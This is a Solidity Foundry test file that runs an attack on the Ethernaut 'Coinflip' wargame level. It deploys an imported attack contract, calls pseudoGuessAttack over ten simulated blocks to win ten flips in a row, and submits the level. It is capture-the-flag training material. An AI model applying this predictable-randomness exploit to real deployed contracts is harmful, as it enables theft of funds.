// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/03-Coinflip/CoinflipFactory.sol";
import "../../../src/core/Ethernaut.sol";
import "./CoinflipAttack.sol";

contract CoinflipTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testCoinflipHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        CoinflipFactory coinflipFactory = new CoinflipFactory();
        ethernaut.registerLevel(coinflipFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(coinflipFactory);
        Coinflip ethernautCoinflip = Coinflip(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // deploy the attack contract
        CoinflipAttack attackContract = new CoinflipAttack(ethernautCoinflip);

        // attack for 10 blocks
        for (uint256 index = 0; index < 10; index++) {
            // set block number
            vm.roll(101 + index);
            // call the attack function
            attackContract.pseudoGuessAttack();
        }

        assertEq(ethernautCoinflip.consecutiveWins(), 10);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
